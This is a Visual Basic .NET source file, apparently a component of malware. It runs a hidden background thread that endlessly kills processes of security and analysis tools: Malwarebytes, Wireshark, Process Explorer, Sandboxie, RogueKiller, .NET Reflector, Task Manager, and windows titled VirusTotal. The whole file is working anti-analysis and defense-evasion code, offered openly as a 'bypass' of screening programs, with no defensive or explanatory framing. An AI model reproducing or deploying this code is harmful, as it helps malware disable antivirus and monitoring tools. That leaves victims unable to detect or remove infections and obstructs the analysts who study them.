﻿Imports System.Diagnostics
Public Class Screening_Programs ' Bypassing 50 Screaning Programs Use MainWindowTitle + GetProcessesByName
    Public Function Start()
        Dim thread As Threading.Thread = New Threading.Thread(AddressOf Bypass)
        thread.IsBackground = True
        thread.Start()
        Return True
    End Function
    Public Function Bypass()
        Dim st As Integer = +1
        If st <> 2 Then
            On Error Resume Next
bypass:
            On Error Resume Next
            Dim Black() As Process = System.Diagnostics.Process.GetProcessesByName("procexp")
            For Each Hacker As Process In Black
                Hacker.Kill()
            Next
            Dim Black1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
            For Each Hacker1 As Process In Black1
                Hacker1.Kill()
            Next
            Dim Black2() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
            For Each Hacker2 As Process In Black2
                Hacker2.Kill()
            Next
            Dim Black3() As Process = System.Diagnostics.Process.GetProcessesByName("SpeedGear")
            For Each Hacker3 As Process In Black3
                Hacker3.Kill()
            Next
            Dim Black9() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
            For Each Hacker9 As Process In Black9
                Hacker9.Kill()
            Next
            Dim Black10() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
            For Each Hacker10 As Process In Black10
                Hacker10.Kill()
            Next
            Dim Black13() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
            For Each Hacker13 As Process In Black13
                Hacker13.Kill()
            Next
            Dim Black14() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
            For Each Hacker14 As Process In Black14
                Hacker14.Kill()
            Next
            Dim Black15() As Process = System.Diagnostics.Process.GetProcessesByName("cports")
            For Each Hacker15 As Process In Black15
                Hacker15.Kill()
            Next
            Dim Black16() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessHacker")
            For Each Hacker16 As Process In Black16
                Hacker16.Kill()
            Next
            Dim Black17() As Process = System.Diagnostics.Process.GetProcessesByName("KeyScrambler")
            For Each Hacker17 As Process In Black17
                Hacker17.Kill()
            Next
            Dim Black18() As Process = System.Diagnostics.Process.GetProcessesByName("TiGeR-Firewall")
            For Each Hacker18 As Process In Black18
                Hacker18.Kill()
            Next
            Dim Black19() As Process = System.Diagnostics.Process.GetProcessesByName("Tcpview")
            For Each Hacker19 As Process In Black19
                Hacker19.Kill()
            Next
            Dim Black20() As Process = System.Diagnostics.Process.GetProcessesByName("xn5x")
            For Each Hacker20 As Process In Black20
                Hacker20.Kill()
            Next
            Dim Black21() As Process = System.Diagnostics.Process.GetProcessesByName("smsniff")
            For Each Hacker21 As Process In Black21
                Hacker21.Kill()
            Next
            Dim Black22() As Process = System.Diagnostics.Process.GetProcessesByName("exeinfoPE")
            For Each Hacker22 As Process In Black22
                Hacker22.Kill()
            Next
            Dim Black23() As Process = System.Diagnostics.Process.GetProcessesByName("regshot")
            For Each Hacker23 As Process In Black23
                Hacker23.Kill()
            Next
            Dim Black24() As Process = System.Diagnostics.Process.GetProcessesByName("RogueKiller")
            For Each Hacker24 As Process In Black24
                Hacker24.Kill()
            Next
            Dim Black25() As Process = System.Diagnostics.Process.GetProcessesByName("NetSnifferCs")
            For Each Hacker25 As Process In Black25
                Hacker25.Kill()
            Next
            Dim Black26() As Process = System.Diagnostics.Process.GetProcessesByName("taskmgr")
            For Each Hacker26 As Process In Black26
                Hacker26.Kill()
            Next
            Dim Black27() As Process = System.Diagnostics.Process.GetProcessesByName("Reflector")
            For Each Hacker27 As Process In Black27
                Hacker27.Kill()
            Next
            Dim Black28() As Process = System.Diagnostics.Process.GetProcessesByName("capsa")
            For Each Hacker28 As Process In Black28
                Hacker28.Kill()
            Next
            Dim Black29() As Process = System.Diagnostics.Process.GetProcessesByName("NetworkMiner")
            For Each Hacker29 As Process In Black29
                Hacker29.Kill()
            Next
            Dim Black30() As Process = System.Diagnostics.Process.GetProcessesByName("AdvancedProcessController")
            For Each Hacker30 As Process In Black30
                Hacker30.Kill()
            Next
            Dim Black31() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessLassoLauncher")
            For Each Hacker31 As Process In Black31
                Hacker31.Kill()
            Next
            Dim Black32() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessLasso")
            For Each Hacker32 As Process In Black32
                Hacker32.Kill()
            Next
            Dim Black33() As Process = System.Diagnostics.Process.GetProcessesByName("SystemExplorer")
            For Each Hacker33 As Process In Black33
                Hacker33.Kill()
            Next
            For Each proc As Process In Process.GetProcesses
                If proc.MainWindowTitle.Contains("ApateDNS") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Malwarebytes Anti-Malware") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Malwarebytes Anti-Malware") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("TCPEye") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("SmartSniff") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Active Ports") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("ProcessEye") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("MKN TaskExplorer") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("CurrPorts") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("System Explorer") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("DiamondCS Port Explorer") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("VirusTotal") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Metascan Online") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Speed Gear") Then
                    proc.Kill()
                End If
                If proc.ProcessName.Contains("The Wireshark Network Analyzer") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("Sandboxie Control") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains("ApateDNS") Then
                    proc.Kill()
                End If
                If proc.MainWindowTitle.Contains(".NET Reflector") Then
                    proc.Kill()
                End If
            Next
            Resume bypass
        End If
    End Function
End Class
